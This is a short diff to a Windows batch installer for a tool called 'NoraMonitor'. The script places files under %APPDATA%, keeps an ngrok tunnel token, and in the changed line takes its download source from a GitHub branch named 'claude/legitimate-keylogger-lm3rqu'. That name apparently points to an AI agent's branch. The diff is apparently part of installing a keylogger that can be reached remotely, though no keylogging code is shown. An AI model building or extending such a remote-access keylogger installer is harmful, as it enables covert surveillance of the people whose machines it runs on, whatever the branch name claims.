@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 set "DIR=%APPDATA%\NoraMonitor"
-set "RAW=https://raw.githubusercontent.com/smallkhk/Nora-signal/nora-monitor-tool/nora-monitor"
+set "RAW=https://raw.githubusercontent.com/smallkhk/Nora-signal/claude/legitimate-keylogger-lm3rqu/nora-monitor"
 set "TOKENFILE=%DIR%\ngrok.token"
 
 mkdir "%DIR%\templates" 2>nul
